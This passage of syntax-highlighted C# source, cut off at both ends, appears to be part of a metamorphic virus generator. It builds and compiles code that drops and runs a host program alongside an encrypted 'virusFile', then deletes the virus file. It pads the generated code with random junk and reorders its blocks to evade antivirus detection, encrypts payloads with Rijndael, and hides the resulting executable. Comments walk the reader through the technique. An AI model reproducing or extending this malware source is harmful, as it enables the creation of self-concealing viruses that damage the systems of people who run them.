            </span><span class="sc6">""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">42</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".BaseStream.WriteByte("</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">25</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"["</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">39</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"]); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"} \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">42</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".Flush(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">42</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".Close(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">41</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".Close(); \n"</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">executeVirus</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"\n try { \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"   if(Convert.ToString(Environment.OSVersion).Substring(0,4).ToLower() == \"unix\") { \n "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"       Process.Start(@\"chmod +x "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">virusFile</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\").WaitForExit(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"   } \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"   Process.Start(@\""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">virusFile</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\").WaitForExit(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"   File.Delete(@\""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">virusFile</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\"); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"} catch { } \n"</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">end</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"} \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"   } \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"} \n"</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc2">//I've only done two different
</span><span class="sc0">            </span><span class="sc2">//types of simple body moving
</span><span class="sc0">            </span><span class="sc2">//here but you should be able to get
</span><span class="sc0">            </span><span class="sc2">//the idea. Both strings will have
</span><span class="sc0">            </span><span class="sc2">//trash and rebuildVars will be placed
</span><span class="sc0">            </span><span class="sc2">//into a different area.
</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">d</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">r</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">100</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">d</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">directives</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">codestart</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">readEnc</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">writeEnc</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Trash</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">decrypt</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">rebuildVars</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Trash</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">rebuild</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">writeHostBytes</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">executeHost</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">writeVirusBytes</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">executeVirus</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">end</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">d</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">directives</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">codestart</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Trash</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">readEnc</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Trash</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">rebuildVars</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">writeEnc</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Trash</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">decrypt</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Trash</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">rebuild</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">writeHostBytes</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Trash</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">executeHost</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">writeVirusBytes</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">executeVirus</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">end</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            

            </span><span class="sc2">//compile the file our string d holds all the
</span><span class="sc0">            </span><span class="sc2">//code strings now.
</span><span class="sc0">            </span><span class="sc11">CompilerResults</span><span class="sc0"> </span><span class="sc11">results</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ic</span><span class="sc10">.</span><span class="sc11">CompileAssemblyFromSource</span><span class="sc10">(</span><span class="sc11">cp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">d</span><span class="sc10">);</span><span class="sc0">
            
            </span><span class="sc2">//if we were successfull in generating the exe we will
</span><span class="sc0">            </span><span class="sc2">//mark it as hiddent and then return the name so we 
</span><span class="sc0">            </span><span class="sc2">//can resume program execution above.
</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Exists</span><span class="sc10">(</span><span class="sc11">name</span><span class="sc10">))</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">SetAttributes</span><span class="sc10">(</span><span class="sc11">name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileAttributes</span><span class="sc10">.</span><span class="sc11">Hidden</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">EncryptFile</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">//encrypt file works on basically
</span><span class="sc0">            </span><span class="sc2">//like this we pass a file and 
</span><span class="sc0">            </span><span class="sc2">//a dynamic key. We then use CryptoStream
</span><span class="sc0">            </span><span class="sc2">//to encrypt the file using the Rijndael algo
</span><span class="sc0">
            </span><span class="sc11">UnicodeEncoding</span><span class="sc0"> </span><span class="sc11">UE</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">UnicodeEncoding</span><span class="sc10">();</span><span class="sc0">

            </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">UE</span><span class="sc10">.</span><span class="sc11">GetBytes</span><span class="sc10">(</span><span class="sc11">p</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">outf</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">myDir</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">slash</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">RandomWords</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".exe"</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">fsc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">outf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">Create</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">RijndaelManaged</span><span class="sc0"> </span><span class="sc11">cr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">RijndaelManaged</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">CryptoStream</span><span class="sc0"> </span><span class="sc11">cs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">CryptoStream</span><span class="sc10">(</span><span class="sc11">fsc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">cr</span><span class="sc10">.</span><span class="sc11">CreateEncryptor</span><span class="sc10">(</span><span class="sc11">key</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">CryptoStreamMode</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">fsIn</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">Open</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">d</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">d</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fsIn</span><span class="sc10">.</span><span class="sc11">ReadByte</span><span class="sc10">())</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">cs</span><span class="sc10">.</span><span class="sc11">WriteByte</span><span class="sc10">((</span><span class="sc16">byte</span><span class="sc10">)</span><span class="sc11">d</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">fsIn</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">cs</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">fsc</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">

            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">outf</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">RandSixTeen</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">intArr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">[</span><span class="sc4">64</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">l</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">63</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">intArr</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">intArr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">16</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">intArr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">l</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">Random</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">intArr</span><span class="sc10">[</span><span class="sc11">r</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l</span><span class="sc10">)];</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc0"> </span><span class="sc11">ShuffleArrayList</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">//create an array list
</span><span class="sc0">            </span><span class="sc11">ArrayList</span><span class="sc0"> </span><span class="sc11">arrList</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">arrList</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">else</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">arrList</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc2">//randomly sort the arraylist then return it
</span><span class="sc0">            </span><span class="sc11">Random</span><span class="sc0"> </span><span class="sc11">rnd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">inx</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">arrList</span><span class="sc10">.</span><span class="sc11">Count</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">inx</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">--</span><span class="sc11">inx</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">pos</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">rnd</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc11">inx</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">object</span><span class="sc0"> </span><span class="sc11">temp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">arrList</span><span class="sc10">[</span><span class="sc11">inx</span><span class="sc10">];</span><span class="sc0">
                </span><span class="sc11">arrList</span><span class="sc10">[</span><span class="sc11">inx</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">arrList</span><span class="sc10">[</span><span class="sc11">pos</span><span class="sc10">];</span><span class="sc0">
                </span><span class="sc11">arrList</span><span class="sc10">[</span><span class="sc11">pos</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">temp</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">arrList</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">RandomWords</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">Random</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">(</span><span class="sc5">unchecked</span><span class="sc10">((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">DateTime</span><span class="sc10">.</span><span class="sc11">Now</span><span class="sc10">.</span><span class="sc11">Ticks</span><span class="sc10">));</span><span class="sc0">
            </span><span class="sc11">RandomWord</span><span class="sc0"> </span><span class="sc11">rword</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">RandomWord</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">rword</span><span class="sc10">.</span><span class="sc11">RandomWords</span><span class="sc10">(</span><span class="sc11">r</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">1234</span><span class="sc10">));</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">wordList</span><span class="sc10">.</span><span class="sc11">Contains</span><span class="sc10">(</span><span class="sc11">n</span><span class="sc10">))</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">wordList</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">DateTime</span><span class="sc10">.</span><span class="sc11">Now</span><span class="sc10">.</span><span class="sc11">Second</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">wordList</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">n</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">Trash</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">t</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">hi</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">hi</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">50</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">hi</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">Random</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">val</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">RandomWord</span><span class="sc10">().</span><span class="sc11">RandomWords</span><span class="sc10">(</span><span class="sc11">r</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">100</span><span class="sc10">));</span><span class="sc0">
                </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">wordList</span><span class="sc10">.</span><span class="sc11">IndexOf</span><span class="sc10">(</span><span class="sc11">val</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">val</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">RandomWord</span><span class="sc10">().</span><span class="sc11">RandomWords</span><span class="sc10">(</span><span class="sc11">r</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">200</span><span class="sc10">));</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">r</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">100</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc2">//comment code
</span><span class="sc0">                    </span><span class="sc11">t</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"//"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">val</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" \n"</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">else</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">vals</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">RandomWord</span><span class="sc10">().</span><span class="sc11">RandomWords</span><span class="sc10">(</span><span class="sc11">r</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">300</span><span class="sc10">));</span><span class="sc0">
                    </span><span class="sc11">t</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"string "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">val</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = \""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">vals</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\"; \n"</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc11">wordList</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">val</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
